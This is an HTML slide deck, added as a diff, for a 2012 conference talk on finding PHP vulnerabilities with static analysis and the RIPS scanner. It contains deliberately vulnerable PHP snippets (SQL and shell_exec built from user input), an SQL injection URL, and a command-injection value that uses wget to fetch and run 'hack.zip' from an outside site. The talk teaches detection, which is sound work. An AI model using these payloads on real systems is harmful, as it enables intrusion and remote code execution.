@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+
+<!--
+  Google HTML5 slide template
+
+  Authors: Luke Mahé (code)
+           Marcin Wichary (code and design)
+           
+           Dominic Mazzoni (browser compatibility)
+           Charles Chen (ChromeVox support)
+
+  URL: http://code.google.com/p/html5slides/
+-->
+
+<html>
+  <head>
+    <title>LCA 2012: PHP Static Code Analysis</title>
+
+    <meta charset='utf-8'>
+    <script
+      src='http://html5slides.googlecode.com/svn/trunk/slides.js'></script>
+  </head>
+  
+  <style>
+    /* Your individual styles here, or just use inline styles if that’s
+       what you want. */
+    
+    
+  </style>
+
+  <body style='display: none'>
+
+    <section class='slides layout-regular template-lca'>
+      
+      <!-- Your slides (<article>s) go here. Delete or comment out the
+           slides below. -->
+        
+        
+      
+      <article class='biglogo'>
+	<h1>
+		Finding vulnerabilities in PHP code
+	</h1>
+	<h3>
+		(via static code analysis) 
+	</h3>
+	<p>By Peter Serwylo</p>
+	<p>http://peter.serwylo.com</p>
+	<p>@serwylo</p>
+      </article>
+
+	<article class="next">
+		<h1>
+			Vulnerabilities crash course
+		</h1>
+	</article>
+
+	<article class="next">
+		<h1>
+			Unsanitized user input
+		</h1>
+	</article>
+
+	<article class="next">
+		<h1>
+			Quick quiz:
+		</h1>
+		<p>
+			What happens next?
+		</p>
+		<pre class="prettyprint">
+$id = $_GET['id']; 
+$username = "user" . $id;
+mysqli_query( "
+	SELECT * 
+	FROM Users 
+	WHERE Username = '" . $username . "' AND Valid = 1" );
+		</pre>
+	</article>
+
+	<article class="fill">
+		<p class="build">
+			<img class="to-build" src="balrog.jpg">
+		</p>
+		<div class="source white">
+			Source: http://lotr.wikia.com
+		</div>
+	</article>
+
+	<article>
+		<h3>
+			Problem:
+		</h3>
+		<p class="build">
+				<p class="to-build">
+					http://example.com/?id=1' OR 1 #
+				</p>
+				<pre class="to-build" class="prettyprint">
+$id = $_GET['id']; 
+$username = "user" . $id;
+mysqli_query( "
+	SELECT * 
+	FROM Users 
+	WHERE Username = '" . $username . "' AND Valid = 1" );
+				</pre>
+				<pre class="prettyprint lang-sql to-build">
+SELECT * 
+FROM Users 
+WHERE Username = 'user1' OR 1 # AND Valid = 1"
+				</pre>
+		</p>
+	</article>
+
+	<article>
+		<p style="padding-top: 50px">
+			<img class="centered" src="xkcd-sql.png">
+		</p>
+		<div class="source">
+			Source: http://xkcd.com/327 <br />
+			title="Her daughter is named Help I'm trapped in a driver's license factory."
+		</div>
+	</article>
+
+	<article>
+		<h1>
+			Okay, but that was fairly obvious!
+		</h1>
+	</article>
+
+      <article>
+        <h1>
+          But what about...
+        </h1>
+        <pre>
+foreach ( $_REQUEST as $key =&gt; $value )
+{
+	$$key = $value;
+}
+...
+// 25 lines of miscellanious, unrelated code
+...
+mysqli_query(
+	"SELECT * FROM Users WHERE Username = '" . $username . "'" );
+	</pre>
+      </article>
+
+      <article class="fill smaller">
+        <p class="build">
+          <img class="to-build" src="balrog.jpg">
+        </p>
+        <div class="source white">
+          Source: http://lotr.wikia.com
+        </div>
+      </article>
+      
+	<article>
+        <h1>
+        	"Just don't do it"
+		</h1>
+	</article>
+
+	<article>
+		<h1>
+			My problem:
+		</h1>
+		<pre>
+$taintedCmd = "wc -w " . $_GET['file'];
+shell_exec( $taintedCmd );
+		</pre>
+      </article>
+
+      <article class="fill">
+        <p class="build">
+          <img class="to-build" src="balrog.jpg">
+        </p>
+        <div class="source white">
+          Source: http://lotr.wikia.com
+        </div>
+      </article>
+
+	<article>
+		<h3>
+			Problem:
+		</h3>
+		<p>
+http://example.com/?file=<br />
+&nbsp;&nbsp;file.txt' &amp;&amp;<br />
+&nbsp;&nbsp;wget http://dogeysite.com/hack.zip &amp;&amp;<br />
+&nbsp;&nbsp;unzip hack.zip &amp;&amp;<br />
+&nbsp;&nbsp;./hack.sh #
+		</p>
+	</article>
+
+	<article class="fill">
+		<p class="build">
+			<img class="to-build" src="steelin-ur-datax.jpg" />
+		</p>
+	</article>
+
+      <article>
+        <h3>
+          First thought:
+        </h3>
+        <pre class="prettyprint lang-bash">
+grep -r -B 10 -i "shell_exec" &gt;&gt; commandExecutions.txt 
+        </pre>
+        <pre>
+...
+file.php-     $cmd = "find -name '" . $name . "' documents/";
+file.php-   }
+file.php- }   
+file.php: echo shell_exec( $cmd );
+        </pre>
+      </article>
+
+      <article class="fill smaller">
+        <p class="build">
+          <img class="to-build" src="rubbish-bin.png">
+        </p>
+        <div class="source white">
+          http://www.sciencephoto.com
+        </div>
+      </article>
+
+      <article class="smaller">
+        <h3>
+          But...
+        </h3>
+        <iframe src="http://au.php.net/manual/en/ref.exec.php"></iframe>
+      </article>
+
+      <article class="fill smaller">
+        <p class="build">
+          <img class="to-build" src="rubbish-tip.jpg">
+        </p>
+        <div class="source white">
+          http://looneytunes09.files.wordpress.com/2010/08/landfill.jpg
+        </div>
+      </article>
+
+      <article>
+        <h1>
+          How do you detect vulnerabilities in code?
+        </h1>
+	<p class="build">
+		<p class="to-build">
+			http://www.google.com.au/search?q=
+			<br />
+			&nbsp;&nbsp;how+do+you+detect+vulnerabilities+in+code
+		</p>
+	</p>
+      </article>
+
+	<article>
+		<img class="centered" src="fwse.png">
+	</article>
+
+	<article>
+		<h1>Static Code Analysis (SCA)</h1>
+		<p>Source Code Analysis</p>
+		<p>Static Program Analysis</p>
+		<p>Compile Time Analysis (well, not for PHP)</p>
+	</article>
+
+	<article>
+		<h1>Analysis without execution</h1>
+		<p>Optimising compilers (e.g. g++)</p>
+		<p>IDE's with type checking/code completion</p>
+	</article>
+
+	<article>
+		<h1>Step 1: Lexical analysis</h1>
+		<p>Split code into tokens</p>
+		<div class="source">Source: http://sourceforge.net/projects/rips-scanner/files/rips-paper.pdf/download</div>
+	</article>
+
+	<article>
+		<h1>Step 2: Semantic analysis</h1>
+		<pre>print "print";</pre>
+		<p>First print is a command</p>
+		<p>Second print is a string</p>
+		<div class="source">Source: http://sourceforge.net/projects/rips-scanner/files/rips-paper.pdf/download</div>
+	</article>
+
+	<article>
+		<h1>Step 3: Control flow analysis</h1>
+		<pre>
+function firstCall( $input ) {
+	return secondCall( $input ) . " - 1st";
+}
+
+function secondCall( $input ) {
+	return $input . " - 2nd";
+}
+
+firstCall( "input" );
+</pre>
+		<div class="source">Source: http://sourceforge.net/projects/rips-scanner/files/rips-paper.pdf/download</div>
+	</article>
+
+	<article>
+		<h1>Step 4: Data flow analysis</h1>
+		<pre>
+function firstCall( $input ) {
+	return secondCall( escapeshellarg( $input ) );
+}
+
+function secondCall( $input ) {
+	return shell_exec( $input ); // Is $input safe?
+}
+
+firstCall( $_GET['input'] );  // Safe
+secondCall( $_GET['input'] ); // Not-safe
+</pre>
+		<div class="source">Source: http://sourceforge.net/projects/rips-scanner/files/rips-paper.pdf/download</div>
+	</article>
+
+	<article class="fill">
+		<img src="coke-crushed.jpg">
+		<div class="source white">
+			http://www.flickr.com/photos/ruthyyy/5000648691
+		</div>
+	</article>
+
+	<article>
+		<img class="centered" src="can-patent.png">
+	</article>
+
+	<article>
+		<h1>RIPS - PHP Scanner</h1>
+		<p>http://www.phpscanner.net</p>
+	</article>
+
+	<article>
+		<h1>
+			Example time
+		</h1>
+	</article>
+
+	<article>
+		<h3>Example 1</h3>
+		<pre class="prettyprint lang-php">
+shell_exec( $_GET['input'] );
+		</pre>
+		<div class="source">
+			<a target="_blank" href="http://rips.gamma.peter.serwylo.com/">http://rips.gamma.peter.serwylo.com/</a>
+			<br />
+			/srv/http-rips/tests/vuln1.php
+		</div>
+	</article>
+
+	<article>
+		<h3>Example 2</h3>
+		<pre class="prettyprint lang-php">
+function vulnFunction( $cmd ) {
+	$result = shell_exec( $cmd );
+}
+
+function intermittentFunction( $input ) {
+	$param = "test " . $input . " bleh";
+	vulnFunction( $param );
+}
+
+$firstHand = $_GET['input'];
+$secondHand = "IMZ TAINTED: " . $firstHand . ", YEAH!";
+
+intermittentFunction( $secondHand );
+		</pre>
+		<div class="source">
+			<a target="_blank" href="http://rips.gamma.peter.serwylo.com/">http://rips.gamma.peter.serwylo.com/</a>
+			<br />
+			/srv/http-rips/tests/vuln2.php
+		</div>
+	</article>
+
+	<article>
+		<h1>
+			Miscellanious PHP projects from freecode.com
+		</h1>
+		<p>(formally freshmeat.net)</p>
+	</article>
+
+	<article>
+		<img class="centered" src="sacrifice.jpg">
+	</article>
+
+	<article>
+		<h3>
+			Example 3
+		</h3>
+		<br />
+		<a target="_blank" href="rips-results/test-1.html">
+			<img class="centered" width="90%" src="test-1-screenie.png" />
+		</a>
+	</article>
+
+	<article>
+		<h2>
+			False Positives
+		</h2>
+		<br />
+		<img class="centered" width="90%" src="custom-sanitizer.png" />
+	</article>
+	
+	<article class="fill">
+		<img src="cans-pile.jpg">
+		<div class="source white">
+			http://www.cancrusher.co.za
+		</div>
+	</article>
+	
+	<article>
+		<h1>
+			Custom Securing Functions
+		</h1>
+	</article>
+
+	<article class="fill">
+		<p class="build">
+			<img src="securing-gravel.jpg" class="to-build">
+		</p>
+		<div class="source white">
+			http://winningateverything.com
+		</div>
+	</article>
+
+      <article>
+	<h1>
+		Custom Securing Functions
+	</h1>
+	
+	<p>
+		config/securing.php
+	</p>
+
+	<pre class="prettyprint lang-php">
+// securing functions for file handling
+$F_SECURING_FILE = array(
+	'sanitize_filename'
+);
+	</pre>
+      </article>
+
+	<article>
+		<h1>
+			Custom Securing Functions
+		</h1>
+		<p>
+			config/securing.php
+		</p>
+		<pre class="prettyprint lang-php">
+// securing functions for every vulnerability
+$F_SECURING_STRING = array(
+	'sanitize_int',
+	'intval',
+	'floatval',
+	'md5',
+	...
+		</pre>
+	</article>
+
+      <article>
+	<h3>
+		Limitations
+	</h3>
+	<ul class="build">
+		<li class="to-build">OOP not supported</li>
+		<li class="to-build">Can't successfully resolve all includes</li>
+		<li class="to-build">Browser based</li>
+		<li class="to-build">Slow to scan</li>
+	</ul>
+      </article>
+
+      <article>
+	<h1>
+		What I'd love to see
+	</h1>
+	<p>
+		Plugins for php compilers (e.g. HipHop/phc/rphp)
+	</p>
+	<ul>
+		<li>Written in C++ for improved performance</li>
+		<li>Already have established parsers</li>
+		<li>Already analyse code for optimisations</li>
+	</ul>
+      </article>
+
+	<article class="fill">
+		<h1>Thanks for listening</h1>
+		<p>Questions?</p>
+		<!--<p class="build">
+			<img class="to-build" src="kthnxbai.jpg" />
+		</p>
+		<div class="source white">
+			http://cheezburger.com
+		</div>-->
+	</article>
+
+    </section>
+
+  </body>
+</html>
+
